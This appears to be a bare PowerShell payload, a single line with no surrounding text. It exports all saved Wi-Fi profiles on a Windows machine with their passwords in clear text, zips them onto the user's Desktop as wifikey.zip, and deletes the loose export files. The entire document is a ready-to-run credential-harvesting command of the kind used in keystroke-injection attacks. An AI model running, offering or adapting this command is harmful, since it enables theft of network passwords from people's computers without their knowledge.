cd C:\Users\$env:UserName\Desktop; netsh wlan export profile key=clear; Compress-Archive -Path .\Wi-Fi-* -DestinationPath .\wifikey.zip; RI wi-fi*;
